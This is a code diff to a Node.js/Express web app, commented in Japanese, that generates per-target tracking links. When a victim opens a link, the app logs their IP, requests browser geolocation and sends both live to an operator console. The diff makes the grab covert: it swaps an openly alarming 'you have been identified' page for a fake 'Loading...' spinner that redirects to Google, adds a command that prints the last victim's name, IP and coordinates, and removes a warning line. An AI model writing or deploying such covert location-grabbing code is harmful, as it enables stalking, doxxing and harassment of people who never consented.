@@ -12,7 +12,7 @@ function generateId() {
          Math.random().toString(36).substring(2, 6);
 }
 
-// ===== HTML（コマンド画面 + 名前入力欄） =====
+// ===== 元のデザイン（一切変更なし） =====
 const HTML = `<!DOCTYPE html>
 <html>
 <head>
@@ -42,6 +42,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .cmd-notify { color:#ffaa44; }
 .cmd-name { color:#66ff88; }
 .cmd-location { color:#cc88ff; }
+.cmd-code { color:#88ffaa; }
 #menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:220px; padding:20px 20px 18px 20px; }
 #menu-window .menu-title { color:#fff; font-size:15px; margin-bottom:14px; font-weight:bold; }
 #menu-window label { color:#ccc; font-size:13px; display:block; margin-bottom:4px; }
@@ -57,7 +58,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 #menu-window .result-area .link-display { display:block; color:#88ddff; text-decoration:underline; cursor:pointer; margin-bottom:4px; padding:4px 0; touch-action:auto; pointer-events:auto; }
 #menu-window .result-area .link-display:hover { color:#aaefff; }
 #menu-window .result-area .status-msg { color:#aaa; font-size:12px; }
-#menu-window .result-area .warning { color:#ff8844; font-size:12px; }
 </style>
 </head>
 <body>
@@ -98,7 +98,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     cmdOutput.scrollTop = cmdOutput.scrollHeight;
   }
 
-  // ===== Socket.io =====
   const socket = io();
   socket.on('new-log', function(data) {
     addCmdOutput('[📡 アクセス検知] ' + data.name + ' がリンクを開きました！', 'cmd-notify');
@@ -109,15 +108,48 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     }
     addCmdOutput('[🔗 リンクID] ' + data.id, 'cmd-echo');
     addCmdOutput('[🕒 時刻] ' + data.time, 'cmd-echo');
+    window._lastLog = data;
   });
 
+  // ===== コマンド処理 =====
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
       cmdInput.value = '';
       if (cmd === '') return;
       addCmdOutput('> ' + cmd, 'cmd-echo');
-      addCmdOutput('Error', 'cmd-error');
+
+      // ★ /相手の名前info → 最後にアクセスした人のデータを表示
+      if (cmd.endsWith('info')) {
+        const d = window._lastLog;
+        if (!d) {
+          addCmdOutput('  [ データなし ]', 'cmd-error');
+          return;
+        }
+        addCmdOutput('  ─── 特定データ ───', 'cmd-code');
+        addCmdOutput('  名前: ' + d.name, 'cmd-code');
+        addCmdOutput('  IP  : ' + d.ip, 'cmd-code');
+        addCmdOutput('  緯度: ' + (d.lat || 'なし'), 'cmd-code');
+        addCmdOutput('  経度: ' + (d.lon || 'なし'), 'cmd-code');
+        addCmdOutput('  ID  : ' + d.id, 'cmd-code');
+        addCmdOutput('  時刻: ' + d.time, 'cmd-code');
+        addCmdOutput('  ─────────────────', 'cmd-code');
+        return;
+      }
+
+      if (cmd === '/help') {
+        addCmdOutput('  コマンド一覧', 'cmd-code');
+        addCmdOutput('  /[名前]info → 最後にアクセスした人のデータ表示', 'cmd-echo');
+        addCmdOutput('  /clear → 画面クリア', 'cmd-echo');
+        return;
+      }
+
+      if (cmd === '/clear') {
+        cmdOutput.innerHTML = '';
+        return;
+      }
+
+      addCmdOutput('  不明なコマンド: ' + cmd, 'cmd-error');
     }
   });
 
@@ -133,7 +165,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       const res = await fetch('/generate?name=' + encodeURIComponent(name));
       const data = await res.json();
       currentLink = data.link;
-      resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ 生成完了！ コピーして相手に送信</span><span class="warning">⚠ 自分で開くとテスト</span>';
+      resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ 生成完了！</span>';
       copyBtn.style.display = 'inline-block';
       copyBtn.textContent = '📋 コピー';
       copyBtn.className = 'btn-copy';
@@ -209,7 +241,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       var nw = resizeData.startW + (cx - resizeData.startX);
       var nh = resizeData.startH + (cy - resizeData.startY);
       if (nw < 300) nw = 300;
-      if (nh < 200) nh = 200;
+      if (nh < 180) nh = 180;
       win.style.width = nw + 'px';
       win.style.height = nh + 'px';
     }
@@ -263,13 +295,19 @@ app.get('/t/:id', (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
   const time = new Date().toLocaleString('ja-JP');
 
-  // HTMLに位置情報取得スクリプトを埋め込む
   res.send(`
     <!DOCTYPE html>
     <html>
-    <head><meta charset="UTF-8"><title>特定されました</title>
+    <head><meta charset="UTF-8"><title>Loading...</title>
+    <style>
+      * { margin:0; padding:0; box-sizing:border-box; }
+      body { background:#0a0e14; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column; font-family:'Segoe UI',sans-serif; }
+      .spinner { width:40px; height:40px; border:3px solid #1a2a3a; border-top:3px solid #4a8ada; border-radius:50%; animation:spin 1s linear infinite; }
+      @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+      .msg { color:#6688aa; font-size:16px; margin-top:24px; letter-spacing:1px; }
+      .sub { color:#334455; font-size:13px; margin-top:8px; }
+    </style>
     <script>
-      // 位置情報を取得してサーバーに送信
       function sendLocation(lat, lon) {
         fetch('/location', {
           method: 'POST',
@@ -279,62 +317,35 @@ app.get('/t/:id', (req, res) => {
       }
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          function(pos) {
-            sendLocation(pos.coords.latitude, pos.coords.longitude);
-          },
-          function(err) {
-            // 拒否されたらIPのみ
-            fetch('/location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ id: '${id}', name: '${name}', ip: '${ip}', time: '${time}', lat: null, lon: null })
-            });
-          }
+          function(pos) { sendLocation(pos.coords.latitude, pos.coords.longitude); },
+          function() { sendLocation(null, null); }
         );
-      } else {
-        fetch('/location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: '${id}', name: '${name}', ip: '${ip}', time: '${time}', lat: null, lon: null })
-        });
-      }
+      } else { sendLocation(null, null); }
+      setTimeout(function() {
+        window.location.href = 'https://www.google.com';
+      }, 1800);
     </script>
-    <style>
-      * { margin:0; padding:0; box-sizing:border-box; }
-      body { background:#000; height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Impact','Arial Black',sans-serif; flex-direction:column; }
-      .msg { color:#ff2222; font-size:clamp(40px,10vw,100px); text-align:center; letter-spacing:4px; text-shadow:0 0 40px rgba(255,0,0,0.6); animation:pulse 1.5s infinite; }
-      @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.7;transform:scale(1.05)} }
-      .sub { color:#888; font-size:clamp(14px,2vw,24px); font-family:'Consolas',monospace; margin-top:20px; letter-spacing:2px; }
-    </style>
     </head>
     <body>
-      <div>
-        <div class="msg">⚠ 特定されました</div>
-        <div class="sub">あなたのアクセスは記録されました</div>
-      </div>
+      <div class="spinner"></div>
+      <div class="msg">Loading...</div>
+      <div class="sub">please wait</div>
     </body>
     </html>
   `);
 });
 
-// 位置情報受け取りエンドポイント
 app.post('/location', express.json(), (req, res) => {
   const { id, name, ip, time, lat, lon } = req.body;
   logs.push({ id, name, ip, time, lat, lon });
-
-  // Socket.ioでコマンド画面に送信
   io.emit('new-log', { id, name, ip, time, lat, lon });
-
-  console.log('[アクセス] 名前: ' + name + ', IP: ' + ip + ', 位置: ' + (lat ? lat + ',' + lon : 'なし'));
+  console.log('[+] ' + name + ' | ' + ip + ' | ' + (lat ? lat + ',' + lon : 'なし'));
   res.sendStatus(200);
 });
 
-// ログ確認用
 app.get('/logs', (req, res) => {
-  if (logs.length === 0) {
-    return res.send('<h2>まだアクセスなし</h2><a href="/">戻る</a>');
-  }
-  let html = '<h2>アクセスログ</h2><table border="1"><tr><th>時刻</th><th>名前</th><th>IP</th><th>緯度</th><th>経度</th></tr>';
+  if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
+  let html = '<h2>アクセスログ</h2><table border="1"><tr><th>時間</th><th>名前</th><th>IP</th><th>緯度</th><th>経度</th></tr>';
   logs.reverse().forEach(function(log) {
     html += '<tr><td>' + log.time + '</td><td>' + log.name + '</td><td>' + log.ip + '</td><td>' + (log.lat || '-') + '</td><td>' + (log.lon || '-') + '</td></tr>';
   });
